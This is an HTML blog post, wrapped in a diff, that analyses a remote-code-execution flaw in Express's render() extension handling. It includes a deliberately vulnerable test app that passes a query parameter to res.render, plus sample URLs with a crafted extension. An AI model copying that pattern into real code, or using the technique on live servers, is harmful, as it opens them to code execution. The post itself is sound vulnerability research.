@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Express, RCE via File Extension Confusing ≤ V4.18.2 :: My New Hugo Site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This article is about the RCE vulnerability that occurs only in highly specific cases in web services using the Express framework. Express is a web framework based on Node.js" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://example.org/posts/2022-12-18-rce-express-1/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://example.org/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://example.org/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="https://example.org/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Express, RCE via File Extension Confusing ≤ V4.18.2">
+<meta property="og:description" content="This article is about the RCE vulnerability that occurs only in highly specific cases in web services using the Express framework. Express is a web framework based on Node.js" />
+<meta property="og:url" content="https://example.org/posts/2022-12-18-rce-express-1/" />
+<meta property="og:site_name" content="My New Hugo Site" />
+
+  
+    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2022-12-18 21:41:53 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://example.org/">
+  <div class="logo">
+    re-Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://example.org/posts/2022-12-18-rce-express-1/">Express, RCE via File Extension Confusing ≤ V4.18.2</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2022-12-18</time>
+    
+</div>
+
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <ul>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#function-call-procedure">Function call procedure</a></li>
+<li><a href="#the-analysis">The analysis</a>
+<ul>
+<li><a href="#libapplicationjsl548l610">/lib/application.js#L548L610</a></li>
+<li><a href="#libviewjsl52l95">/lib/view.js#L52L95</a></li>
+<li><a href="#libapplicationjsl655l661">/lib/application.js#L655L661</a></li>
+<li><a href="#libviewjsl133l136">/lib/view.js#L133L136</a></li>
+</ul>
+</li>
+<li><a href="#how-to-trigger-an-rce">How to trigger an RCE</a>
+<ul>
+<li><a href="#code-for-testing">Code for Testing</a></li>
+<li><a href="#check-ejs-extension-management-logic">Check ejs extension management logic</a></li>
+<li><a href="#exploit">Exploit</a></li>
+</ul>
+</li>
+<li><a href="#mitigation">Mitigation</a></li>
+</ul>
+<hr>
+<h1 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Express.js, or simply Express, is a web framework for Node.js, released as free and open source software licensed under the MIT license. It is being called the de facto standard server framework of Node.js.</p>
+<p>I started to analyze it. While analyzing several pieces of code, I found a way to trigger an RCE vulnerability via confusing file extenstion in the render() function.</p>
+<p>The express framework internally calls template libraries such as ejs, Handlebars, and dot using the require() function. Confusion arises in this process.</p>
+<hr>
+<h1 id="function-call-procedure">Function call procedure<a href="#function-call-procedure" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>render() → View() → tryRender() → View.prototype.render → this.engine()
+</span></span></code></pre></div><hr>
+<h1 id="the-analysis">The analysis<a href="#the-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="libapplicationjsl548l610">/lib/application.js#L548L610<a href="#libapplicationjsl548l610" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">render</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cache</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cache</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">callback</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">engines</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">engines</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">renderOptions</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">view</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// support callback function as second arg
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// merge app.locals
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">renderOptions</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">locals</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// merge options._locals
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">_locals</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">renderOptions</span>, <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">_locals</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// merge options
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">renderOptions</span>, <span style="color:#a6e22e">opts</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// set .cache unless explicitly provided
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">renderOptions</span>.<span style="color:#a6e22e">cache</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">renderOptions</span>.<span style="color:#a6e22e">cache</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">enabled</span>(<span style="color:#e6db74">&#39;view cache&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// primed cache
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">renderOptions</span>.<span style="color:#a6e22e">cache</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cache</span>[<span style="color:#a6e22e">name</span>];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// view
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">view</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">View</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;view&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">View</span>(<span style="color:#a6e22e">name</span>, {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">defaultEngine</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>),
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">root</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;views&#39;</span>),
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">engines</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">engines</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">path</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dirs</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">root</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;directories &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>).<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;&#34;, &#34;&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; or &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">root</span>[<span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;directory &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">root</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;Failed to lookup view &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; in views &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dirs</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">view</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">done</span>(<span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// prime the cache
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">renderOptions</span>.<span style="color:#a6e22e">cache</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cache</span>[<span style="color:#a6e22e">name</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">view</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// render
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">tryRender</span>(<span style="color:#a6e22e">view</span>, <span style="color:#a6e22e">renderOptions</span>, <span style="color:#a6e22e">done</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The <code>render()</code> function calls View function if the view variable is empty. And when the function ends, it calls <code>tryRender()</code> function.</p>
+<h2 id="libviewjsl52l95">/lib/view.js#L52L95<a href="#libviewjsl52l95" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">var path = require(&#39;path&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">var extname = path.extname;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">View</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">options</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">||</span> {};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">defaultEngine</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">defaultEngine</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">extname</span>(<span style="color:#a6e22e">name</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">root</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">root</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">defaultEngine</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;No default engine was specified and no extension was provided.&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fileName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// get extension from default engine name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">defaultEngine</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;.&#39;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">defaultEngine</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">defaultEngine</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fileName</span> <span style="color:#f92672">+=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">engines</span>[<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span>]) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// load engine
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">mod</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">debug</span>(<span style="color:#e6db74">&#39;require &#34;%s&#34;&#39;</span>, <span style="color:#a6e22e">mod</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// default engine export
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">mod</span>).<span style="color:#a6e22e">__express</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">fn</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;Module &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">mod</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; does not provide a view engine.&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">engines</span>[<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">fn</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// store loaded engine
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">engine</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">engines</span>[<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// lookup path
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lookup</span>(<span style="color:#a6e22e">fileName</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>View()</code> function makes an anonymous function. In some if statement, if the <code>!opts.engines[this.ext]</code> property is empty, after cutting the first letter from the value of this.ext, the value is used to call the <code>require()</code> function. At this time, the function code called <code>__express</code> in the JavaScript file is imported and defined in <code>opts.engines[this.ext]</code>. Then, define the value of <code>opts.engines[this.ext]</code> in this.engine variable. That is, the this.engine variable contains the <code>__express</code> function.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/208300163-99402ac8-17a0-43c5-8f73-75000bf06545.png" alt=""></p>
+<p>This is where the root cause of this vulnerability occurs. After parsing the extension using <code>path.extname()</code>, it does not check the extension. That’s all.</p>
+<h2 id="libapplicationjsl655l661">/lib/application.js#L655L661<a href="#libapplicationjsl655l661" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">tryRender</span>(<span style="color:#a6e22e">view</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In the <code>render()</code> function, call the <code>tryRender()</code> function after calling the <code>View()</code> function. The <code>tryRender()</code> function calls the <code>View.prototype.render()</code> function</p>
+<h2 id="libviewjsl133l136">/lib/view.js#L133L136<a href="#libviewjsl133l136" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">View</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">render</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">debug</span>(<span style="color:#e6db74">&#39;render &#34;%s&#34;&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">engine</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Lastly, in the <code>View.prototype.render()</code> function, the anonymous function <code>this.engine()</code> function is executed.</p>
+<hr>
+<h1 id="how-to-trigger-an-rce">How to trigger an RCE<a href="#how-to-trigger-an-rce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="code-for-testing">Code for Testing<a href="#code-for-testing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">filename</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">page</span>);
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Listening on port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The test code is as above.</p>
+<h2 id="check-ejs-extension-management-logic">Check ejs extension management logic<a href="#check-ejs-extension-management-logic" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>![https://media.discordapp.net/attachments/1049498153801502740/1053999809608044574/2022-12-18_20.38.48.png?width=1550&amp;height=977]</p>
+<ul>
+<li>http://localhost:3000/?filename=test</li>
+<li>http://localhost:3000/?filename=test.ejs</li>
+</ul>
+<p>I checked how the extension is managed in the logic that handles the extension of the file passed to the <code>render()</code> function. When I pass files like <code>render(‘test’)</code>, <code>render(‘test.ejs’)</code>, all extensions are ejs .</p>
+<p><img src="https://media.discordapp.net/attachments/1049498153801502740/1054001435366395904/2022-12-18_20.45.13.png?width=1550&amp;height=977" alt=""></p>
+<ul>
+<li>http://localhost:3000/?filename=rce.pocas</li>
+</ul>
+<p>However, when the <code>render()</code> function is called like <code>render(‘rce.pocas’)</code>, <code>“pocas”</code>, not <code>“ejs”</code>, is included in the extension. Since the engine type was set to <code>“ejs”</code> using <code>app.set()</code> in express, the extension should be ejs in any case, but an arbitrary extension can be inserted because there is no exception handling.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">mod</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ext</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">debug</span>(<span style="color:#e6db74">&#39;require &#34;%s&#34;&#39;</span>, <span style="color:#a6e22e">mod</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// default engine export
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">mod</span>).<span style="color:#a6e22e">__express</span>
+</span></span></code></pre></div><p>That is, I can manipulate the extension and call the JavaScript library I want through the code above! Through the above function, get the <code>__express</code> function of the desired file, put it in this.engine variable, and execute <code>this.engine()</code> in <code>view.prototype.render()</code> function. If a hacker can upload a desired file under node_modules using the file upload function, the desired function code can be inserted into this.engine variable and executed.</p>
+<h2 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><img src="https://media.discordapp.net/attachments/1049498153801502740/1054003691281203230/2022-12-18_20.54.16.png" alt=""></p>
